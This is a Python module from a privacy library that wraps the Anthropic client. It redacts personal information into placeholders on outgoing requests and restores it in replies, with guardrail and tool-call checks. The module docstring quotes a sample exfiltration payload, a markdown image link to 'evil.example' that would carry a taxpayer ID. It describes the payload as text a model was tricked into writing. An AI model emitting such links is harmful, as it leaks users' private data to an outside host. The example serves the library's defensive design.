"""Claude through placeholders: wrap an Anthropic client and the model never sees personal information.

    import anthropic
    from veil import Redactor, FINANCE
    from veil.anthropic import wrap

    client = wrap(anthropic.Anthropic(), Redactor(FINANCE))
    client.redactor.add_person("Avery K. Mockridge")      # people you already know of
    reply = client.messages.create(model="claude-opus-5-5", max_tokens=1024, tools=TOOLS,
                                   messages=[{"role": "user", "content": "Add Avery Mockridge as an LP"}])

Each request goes out as a copy with placeholders in place of the real values
(what the user typed, tool results, the system prompt and the model's earlier
turns), and the reply's text and tool-call inputs come back with the real
values.  Use one redactor per conversation.  Thinking blocks go back exactly
as they came.  The tools' descriptions and ``metadata`` are redacted too, and
web search's ``user_location`` goes with its country and timezone only, not
its city or region (``user_location="send"`` sends it all, ``"drop"`` none).
A request with ``mcp_servers`` raises ``McpError`` unless ``mcp_servers="send"``:
Anthropic calls those servers itself, so what they return reaches the model
without placeholders.  A
content block veil doesn't know raises ``BlockError`` rather than being sent
as it is.

A request with an image, a PDF or a Word document in it is refused
(``FileError``) unless you say otherwise: ``files="read"`` reads their text on
this machine (``veil.files.read_text``) and sends that, redacted, in their
place (so a .docx, which the API doesn't take, can be sent as its text);
``files="send"`` sends them as they are; or pass your own
``reader(data, media_type) -> str``.

With a ``guardrail`` (any object with a ``check(texts, source) -> Findings``
method, raising GuardrailError when it can't check), each new text in a
request is checked first: what it finds becomes a placeholder too, and
anything else it objects to stops the request.  In a reply, a taxpayer ID it
finds is taken out, and a reply it objects to is replaced with a note.  Each
tool call's input is checked too: a taxpayer ID in one is taken out, and a
call it objects to, or can't check, raises GuardrailError, so no tool runs on
it.

A placeholder in a reply's text or a tool call comes back as its real value,
except inside a URL or a link's target, where it stays a placeholder: text
the model was tricked into writing ("![](https://evil.example/?d=SSN_001)")
can't carry a real value off when it's shown or fetched (``restore_urls=True``
lets it).  ``restore`` says which kinds each tool gets back, so a tool that
sends things out can be kept to placeholders:
``restore={"add_member": {"NAME", "SSN"}, "*": set()}``.

Streaming isn't supported yet: ``stream=True`` raises, and so do
``messages.stream``, ``parse``, ``batches``, ``tool_runner`` and the raw
response forms, which would otherwise send the request without placeholders.
"""

from __future__ import annotations

import base64
import copy
import hashlib
from dataclasses import dataclass, field
from typing import Any, Callable, Collection, Mapping

from veil.redactor import Redactor
from veil.tax_ids import TAX_ID_KINDS

TAX_ID_REMOVED = "[taxpayer ID removed]"
_WHAT = {"SSN": "a taxpayer ID", "EIN": "a taxpayer ID", "TIN": "a taxpayer ID", "NAME": "a name",
         "ADDRESS": "an address", "EMAIL": "an email address", "PHONE": "a phone number",
         "ACCOUNT": "an account number", "DOB": "a birth date", "ID": "personal information"}
FILE_UNREAD = "[No text could be read from this file.]"


class GuardrailError(Exception):
    """The guardrail stopped a request, or couldn't check it.  The message is for the user."""


class FileError(Exception):
    """An image or PDF in a request couldn't be sent without what's in it, so nothing was sent.  The message is
    for the user."""


class McpError(Exception):
    """A request named MCP servers, whose replies would reach the model without placeholders, so nothing was
    sent.  The message is for the user."""


class BlockError(Exception):
    """A content block of a kind veil doesn't know how to redact, so nothing was sent.  The message is for the
    user."""


# Blocks the model or Anthropic's own tools wrote, which hold only placeholders already: sent back as they are.
_AS_THEY_ARE = {"thinking", "redacted_thinking", "web_search_tool_result", "web_fetch_tool_result",
                "code_execution_tool_result", "bash_code_execution_tool_result",
                "text_editor_code_execution_tool_result", "tool_search_tool_result", "mcp_tool_use",
                "mcp_tool_result", "tool_reference"}


@dataclass
class Findings:
    """What a guardrail's ``check`` found."""
    hidden: list[tuple[str, str]] = field(default_factory=list)   # (placeholder kind, as written) for each find
    other: list[str] = field(default_factory=list)     # anything else it objected to, in words


def what(kind: str) -> str:
    """A placeholder kind in words: "a taxpayer ID", "a name" ..."""
    return _WHAT.get(kind, "personal information")


def _as_dict(block: Any) -> Any:
    if isinstance(block, dict):
        return dict(block)
    if hasattr(block, "model_dump"):
        return block.model_dump(mode="json", exclude_none=True)
    return block


class Session:
    """One conversation's redactor and guardrail, and the request and reply handling ``wrap`` uses."""

    def __init__(self, redactor: Redactor | None = None, guardrail=None, redact_system: bool = True,
                 files: str | Callable[[bytes, str], str] = "refuse",
                 restore: Mapping[str, Collection[str] | str | None] | None = None, restore_urls: bool = False,
                 user_location: str = "country", mcp_servers: str = "refuse"):
        self.redactor = redactor if redactor is not None else Redactor()
        if mcp_servers not in ("refuse", "send"):
            raise ValueError('mcp_servers must be "refuse" or "send"')
        self.mcp_servers = mcp_servers
        if user_location not in ("country", "send", "drop"):
            raise ValueError('user_location must be "country", "send" or "drop"')
        self.user_location = user_location
        # The kinds each tool's calls get back, by tool name ("*": any other tool); None: every kind.
        self.restore = {name: {kinds} if isinstance(kinds, str) else None if kinds is None else set(kinds)
                        for name, kinds in (restore or {}).items()}
        self.restore_urls = restore_urls
        self.guardrail = guardrail
        self.redact_system = redact_system
        if files == "read":
            from veil.files import read_text
            files = read_text
        elif files not in ("send", "refuse") and not callable(files):
            raise ValueError('files must be "send", "read", "refuse" or a function (data, media_type) -> text')
        self.files = files
        self._checked: set[str] = set()   # digests of texts the guardrail has passed
        self._read: dict[str, str] = {}   # each file's text, by digest, so a file is read once a conversation

    # -- requests ----------------------------------------------------------------------------------------

    def redact_request(self, request: dict) -> dict:
        """A copy of a Messages API request (``messages``, ``system`` ...) with placeholders in it, checked by
        the guardrail if there is one."""
        if request.get("mcp_servers") and self.mcp_servers == "refuse":
            names = ", ".join(str(s.get("name") or s.get("url")) for s in request["mcp_servers"] if isinstance(s, dict))
            raise McpError(f"This request names MCP servers ({names}). Anthropic would call them itself, so what "
                           "they return would reach the model without placeholders. Nothing was sent. Pass "
                           'mcp_servers="send" to let them, or call those tools yourself as your own tools.')
        out = self._redact(request)
        return self._guard(request, out) if self.guardrail is not None else out

    def _redact(self, request: dict) -> dict:
        out = dict(request)
        out["messages"] = [self._message(m) for m in request.get("messages") or []]
        if self.redact_system and "system" in request:
            system = request["system"]
            if isinstance(system, str):
                out["system"] = self.redactor.redact_text(system)
            elif isinstance(system, list):
                out["system"] = [self._block(b, "system") for b in system]
        if isinstance(request.get("tools"), list):
            out["tools"] = [self._located(self._tool(t) if self.redact_system else t) for t in request["tools"]]
        if isinstance(request.get("metadata"), dict):
            out["metadata"] = self.redactor.redact(request["metadata"])
        return out

    def _tool(self, tool: Any) -> Any:
        """A tool with its description, and each description in its input schema, redacted."""
        def walk(value: Any) -> Any:
            if isinstance(value, dict):
                return {k: self.redactor.redact_text(v) if k == "description" and isinstance(v, str) else walk(v)
                        for k, v in value.items()}
            if isinstance(value, list):
                return [walk(v) for v in value]
            return value
        return walk(_as_dict(tool))

    def _located(self, tool: Any) -> Any:
        """A server tool (web search) with its ``user_location`` as ``user_location`` says: the country and
        timezone only, all of it, or none."""
        t = _as_dict(tool)
        if not isinstance(t, dict) or not isinstance(t.get("user_location"), dict) or self.user_location == "send":
            return tool
        if self.user_location == "drop":
            return {k: v for k, v in t.items() if k != "user_location"}
        return {**t, "user_location": {k: v for k, v in t["user_location"].items()
                                       if k in ("type", "country", "timezone")}}

    def _message(self, message: dict) -> dict:
        role = message.get("role")
        content = message.get("content")
        if isinstance(content, str):
            return {**message, "content": self.redactor.redact_text(content, typed=role == "user")}
        return {**message, "content": [self._block(b, role) for b in content or []]}

    def _block(self, block: Any, role: str | None) -> Any:
        b = _as_dict(block)
        if not isinstance(b, dict):
            raise BlockError(f"veil can't redact a content block given as {type(block).__name__}. Nothing was sent.")
        kind = b.get("type")
        r = self.redactor
        if kind == "text":
            return {**b, "text": r.redact_text(b.get("text", ""), typed=role == "user")}
        if kind == "tool_use" or kind == "server_tool_use":
            return {**b, "input": r.redact(b.get("input"))}
        if kind == "tool_result":
            content = b.get("content")
            if isinstance(content, str):
                return {**b, "content": r.redact_text(content)}
            if isinstance(content, list):
                return {**b, "content": [self._block(c, None) for c in content]}
            return b
        if kind == "document":
            b = {**b, **{k: r.redact_text(b[k]) for k in ("title", "context") if isinstance(b.get(k), str)}}
            source = b.get("source") if isinstance(b.get("source"), dict) else {}
            if source.get("type") == "text":
                return {**b, "source": {**source, "data": r.redact_text(source.get("data", ""))}}
            if source.get("type") == "content":
                inner = source.get("content")
                inner = r.redact_text(inner) if isinstance(inner, str) else [self._block(c, None) for c in inner or []]
                return {**b, "source": {**source, "content": inner}}
            return self._file(b, role)
        if kind == "image":
            return self._file(b, role)
        if kind == "search_result":   # its content first, so a name it gives is hidden in the title too
            b = {**b, "content": [self._block(c, None) for c in b.get("content") or []]}
            return {**b, **{k: r.redact_text(b[k]) for k in ("source", "title") if isinstance(b.get(k), str)}}
        if kind in _AS_THEY_ARE:
            return b
        raise BlockError(f"veil doesn't know how to redact a {kind!r} block, so it would have reached the model "
                         "as it is. Nothing was sent.")

    def _file(self, b: dict, role: str | None) -> dict:
        """An image or PDF block, as ``files`` says: as it is, or its text redacted in its place."""
        if self.files == "send":
            return b
        media = (b.get("source") or {}).get("media_type", "") if isinstance(b.get("source"), dict) else ""
        name = "An image" if b.get("type") == "image" else "A Word document" if "wordprocessingml" in media \
            else "A PDF"
        if self.files == "refuse":
            raise FileError(f"{name} in this request would have reached the model with any personal information "
                            'in it. Nothing was sent. Pass files="read" to send its text redacted, or files="send" '
                            "to send it as it is.")
        source = b.get("source") if isinstance(b.get("source"), dict) else {}
        if source.get("type") != "base64":
            how = {"url": "a link, which Anthropic would fetch", "file": "an uploaded file ID"}.get(
                source.get("type"), f"a {source.get('type')!r} source")
            raise FileError(f"{name} in this request was given as {how}, so veil can't read it first. Send the "
                            "file's bytes (base64) instead. Nothing was sent.")
        text = self._read_file(source, name)
        text = self.redactor.redact_text(text) if text.strip() else FILE_UNREAD
        title = "Text read from an image" if b.get("type") == "image" else None
        if role != "user":   # inside a tool result or another document: plain text
            out = {"type": "text", "text": f"[{title}]\n{text}" if title else text}
        else:
            out = {"type": "document", "source": {"type": "text", "media_type": "text/plain", "data": text}}
            for key in ("title", "context", "citations"):
                if key in b:
                    out[key] = b[key]
            if title and "title" not in out:
                out["title"] = title
        if "cache_control" in b:
            out["cache_control"] = b["cache_control"]
        return out

    def _read_file(self, source: dict, name: str) -> str:
        data, media_type = source.get("data") or "", source.get("media_type") or ""
        key = self._digest(f"{media_type}\n{data}")
        if key not in self._read:
            try:
                self._read[key] = self.files(base64.b64decode(data), media_type)
            except Exception as exc:
                raise FileError(f"{name} in this request couldn't be read ({exc}). Nothing was sent.") from exc
        return self._read[key]

    def _texts(self, request: dict) -> list[str]:
        texts: list[str] = []

        def walk(value: Any) -> None:
            if isinstance(value, str):
                texts.append(value)
            elif isinstance(value, dict):
                if value.get("type") in ("thinking", "redacted_thinking", "image"):
                    return
                for key, v in value.items():
                    if key not in ("type", "id", "tool_use_id", "role", "name", "cache_control", "signature"):
                        walk(v)
            elif isinstance(value, list):
                for v in value:
                    walk(v)

        walk(request.get("messages"))
        if self.redact_system:
            walk(request.get("system"))

            def descriptions(value: Any) -> None:
                if isinstance(value, dict):
                    for key, v in value.items():
                        if key == "description" and isinstance(v, str):
                            texts.append(v)
                        else:
                            descriptions(v)
                elif isinstance(value, list):
                    for v in value:
                        descriptions(v)
            descriptions(request.get("tools"))
        walk(request.get("metadata"))
        return [t for t in texts if t.strip()]

    def _guard(self, original: dict, redacted: dict) -> dict:
        """Have the guardrail check the texts it hasn't yet passed.  What it finds is hidden too."""
        texts = [t for t in self._texts(redacted) if self._digest(t) not in self._checked]
        if not texts:
            return redacted
        try:
            found = self.guardrail.check(texts, "INPUT")
        except GuardrailError as exc:
            raise GuardrailError(f"{exc} Nothing was sent.") from exc
        other = list(found.other)
        for kind, match in found.hidden:
            if not any(match in t for t in texts):
                other.append(f"{what(kind)} that couldn't be found in the text to hide")
        if other:
            raise GuardrailError(f"The guardrail stopped this request: it flagged {', '.join(dict.fromkeys(other))}. "
                                 "Nothing was sent.")
        if found.hidden:
            for kind, match in found.hidden:
                self.redactor.add(match, kind)
            redacted = self._redact(original)
        self._checked.update(self._digest(t) for t in self._texts(redacted))
        return redacted

    @staticmethod
    def _digest(text: str) -> str:
        return hashlib.sha256(text.encode()).hexdigest()

    # -- replies -----------------------------------------------------------------------------------------

    def restore_response(self, response: Any) -> Any:
        """A copy of a Messages API reply with the real values back in its text and tool call inputs."""
        response = response.model_copy(deep=True) if hasattr(response, "model_copy") else copy.deepcopy(response)
        content = response["content"] if isinstance(response, dict) else response.content
        if self.guardrail is not None:
            self._guard_calls(content)
            self._guard_reply(content)
        for i, block in enumerate(content):
            kind = block.get("type") if isinstance(block, dict) else getattr(block, "type", None)
            if kind == "text":
                self._set(content, i, block, "text",
                          self.redactor.restore_text(self._get(block, "text"), urls=self.restore_urls))
            elif kind == "tool_use":
                kinds = self.restore.get(self._get(block, "name"), self.restore.get("*"))
                self._set(content, i, block, "input",
                          self.redactor.restore(self._get(block, "input"), kinds, urls=self.restore_urls))
        return response

    def _guard_reply(self, content: list) -> None:
        indices = [i for i, b in enumerate(content) if self._get(b, "type") == "text" and self._get(b, "text")]
        if not indices:
            return
        try:
            found = self.guardrail.check([self._get(content[i], "text") for i in indices], "OUTPUT")
        except GuardrailError as exc:
            note = f"(This reply isn't shown, because the guardrail couldn't check it. {exc})"
            found = None
        else:
            note = f"(The guardrail held back this reply: it flagged {', '.join(found.other)}.)" if found.other else None
        if note is not None:
            for n, i in enumerate(indices):
                self._set(content, i, content[i], "text", note if n == 0 else "")
            return
        if not found.hidden:   # sent back next time as it is: no need to check it again
            self._checked.update(self._digest(self._get(content[i], "text")) for i in indices)
        for kind, match in found.hidden:
            self.redactor.add(match, kind)   # so it's a placeholder in every later request
            if kind in TAX_ID_KINDS:
                for i in indices:
                    self._set(content, i, content[i], "text", self._get(content[i], "text").replace(match, TAX_ID_REMOVED))

    def _guard_calls(self, content: list) -> None:
        """Have the guardrail check each tool call's input before it's put back.  A call it objects to, or can't
        check, raises GuardrailError, so no tool runs on it; a taxpayer ID in one is taken out."""
        indices = [i for i, b in enumerate(content) if self._get(b, "type") == "tool_use"]
        texts: list[str] = []
        for i in indices:
            _strings(self._get(content[i], "input"), lambda t: texts.append(t) or t)
        texts = [t for t in texts if t.strip()]
        if not texts:
            return
        try:
            found = self.guardrail.check(texts, "OUTPUT")
        except GuardrailError as exc:
            raise GuardrailError(f"The guardrail couldn't check this reply's tool calls, so none should run. {exc}") \
                from exc
        if found.other:
            raise GuardrailError("The guardrail held back this reply's tool calls: it flagged "
                                 f"{', '.join(dict.fromkeys(found.other))}.")
        if not found.hidden:   # sent back next time as they are: no need to check them again
            self._checked.update(self._digest(t) for t in texts)
        for kind, match in found.hidden:
            self.redactor.add(match, kind)   # so it's a placeholder in every later request
            if kind in TAX_ID_KINDS:
                for i in indices:
                    self._set(content, i, content[i], "input", _strings(
                        self._get(content[i], "input"), lambda t, m=match: t.replace(m, TAX_ID_REMOVED)))

    @staticmethod
    def _get(block: Any, key: str) -> Any:
        return block.get(key) if isinstance(block, dict) else getattr(block, key, None)

    @staticmethod
    def _set(content: list, i: int, block: Any, key: str, value: Any) -> None:
        if isinstance(block, dict):
            content[i] = {**block, key: value}
        else:
            setattr(block, key, value)


def _strings(value: Any, fix: Callable[[str], str]) -> Any:
    """``value`` with ``fix`` applied to each string in it (not dict keys); dicts and lists are walked."""
    if isinstance(value, str):
        return fix(value)
    if isinstance(value, dict):
        return {k: _strings(v, fix) for k, v in value.items()}
    if isinstance(value, (list, tuple)):
        return [_strings(v, fix) for v in value]
    return value


def _unwrapped(name: str, where: str = "messages.") -> NotImplementedError:
    return NotImplementedError(f"veil doesn't redact {where}{name} yet, so it would send the request without "
                               "placeholders; call messages.create instead.")


class _Messages:
    """``create`` and ``count_tokens`` through placeholders.  Everything else the SDK's messages have would send
    the request as it is, so it raises."""

    def __init__(self, messages, session: Session):
        self._messages = messages
        self._session = session

    def create(self, **request):
        if request.get("stream"):
            raise NotImplementedError("veil doesn't redact streamed replies yet; call without stream=True.")
        response = self._messages.create(**self._session.redact_request(request))
        return self._session.restore_response(response)

    def count_tokens(self, **request):
        return self._messages.count_tokens(**self._session.redact_request(request))

    def stream(self, *args, **kwargs):
        raise _unwrapped("stream")

    def parse(self, *args, **kwargs):
        raise _unwrapped("parse")

    def tool_runner(self, *args, **kwargs):
        raise _unwrapped("tool_runner")

    @property
    def batches(self):
        raise _unwrapped("batches")

    @property
    def with_raw_response(self):
        raise _unwrapped("with_raw_response")

    @property
    def with_streaming_response(self):
        raise _unwrapped("with_streaming_response")

    def __getattr__(self, name):
        raise AttributeError(f"veil doesn't wrap messages.{name}, so it isn't offered: it would send the request "
                             "without placeholders.")


# What a wrapped client hands out as it is: its settings, and the models list, which sends nothing of yours.
# Everything else (files, skills, managed agents, raw post and request ...) would send requests without
# placeholders, so it isn't offered; call it on the client you wrapped, knowing nothing sent through it is
# redacted.
_SETTINGS = {"api_key", "auth_token", "access_token", "auth_headers", "custom_auth", "credentials", "base_url",
             "timeout", "max_retries", "default_headers", "default_query", "platform_headers", "user_agent", "qs",
             "middleware", "open_telemetry", "webhook_key", "aws_region", "aws_access_key", "aws_secret_key",
             "aws_session_token", "aws_profile", "region", "project_id", "close", "is_closed", "models"}


def _not_offered(name: str) -> AttributeError:
    return AttributeError(f"veil doesn't wrap {name}, so it isn't offered: it would send requests without "
                          "placeholders. Call it on the client you wrapped if you mean it to.")


class _Beta:
    def __init__(self, beta, session: Session):
        self._beta = beta
        self.messages = _Messages(beta.messages, session)

    @property
    def with_raw_response(self):
        raise _unwrapped("with_raw_response", "beta.")

    @property
    def with_streaming_response(self):
        raise _unwrapped("with_streaming_response", "beta.")

    def __getattr__(self, name):
        if name != "models":
            raise _not_offered(f"beta.{name}")
        return getattr(self._beta, name)


class VeiledClient:
    """An Anthropic client whose ``messages.create`` (and ``beta.messages.create``) go through placeholders.
    ``with_options``, ``copy`` and ``with_middleware`` give another one, with the same conversation.  Its
    settings and ``models`` are the wrapped client's; nothing else is offered (``files``, ``post`` ...), and the
    legacy ``completions`` and the raw response forms raise, since they would send requests without
    placeholders."""

    def __init__(self, client, session: Session):
        self._client = client
        self.session = session
        self.messages = _Messages(client.messages, session)
        if hasattr(client, "beta"):
            self.beta = _Beta(client.beta, session)

    @property
    def redactor(self) -> Redactor:
        return self.session.redactor

    def with_options(self, *args, **kwargs) -> VeiledClient:
        return VeiledClient(self._client.with_options(*args, **kwargs), self.session)

    def copy(self, *args, **kwargs) -> VeiledClient:
        return VeiledClient(self._client.copy(*args, **kwargs), self.session)

    def with_middleware(self, *args, **kwargs) -> VeiledClient:
        return VeiledClient(self._client.with_middleware(*args, **kwargs), self.session)

    @property
    def completions(self):
        raise NotImplementedError("veil doesn't redact the legacy Text Completions API (completions), so it would "
                                  "send the prompt without placeholders; call messages.create instead.")

    @property
    def with_raw_response(self):
        raise _unwrapped("with_raw_response", "")

    @property
    def with_streaming_response(self):
        raise _unwrapped("with_streaming_response", "")

    def __getattr__(self, name):
        if name not in _SETTINGS:
            raise _not_offered(f"client.{name}")
        return getattr(self._client, name)


def wrap(client, redactor: Redactor | None = None, guardrail=None, redact_system: bool = True,
         files: str | Callable[[bytes, str], str] = "refuse",
         restore: Mapping[str, Collection[str] | str | None] | None = None,
         restore_urls: bool = False, user_location: str = "country", mcp_servers: str = "refuse") -> VeiledClient:
    """``client`` (anthropic.Anthropic, AnthropicBedrock ...) with placeholders on the way out and real values
    on the way back.  Use one per conversation, or pass the conversation's ``redactor``.

    ``files`` says what happens to images and PDFs: "refuse" the request (the default), "read" their text
    here and send it redacted instead, "send" them as they are, or a function ``(data, media_type) -> text`` to read them.

    ``restore`` says which placeholder kinds each tool's calls get back as real values, by tool name, with
    ``"*"`` for any tool not named (``{"add_member": {"NAME", "SSN"}, "*": set()}``); a tool it doesn't cover
    gets every kind.  ``restore_urls``: put real values back inside URLs too (by default they stay placeholders).

    ``user_location``: what web search's ``user_location`` sends, "country" (its country and timezone, the
    default), "send" (all of it, city and region too) or "drop" (none).

    ``mcp_servers``: "refuse" a request that names MCP servers (the default), since Anthropic calls them and
    what they return reaches the model as it is, or "send" it."""
    return VeiledClient(client, Session(redactor, guardrail, redact_system, files, restore, restore_urls,
                                        user_location, mcp_servers))
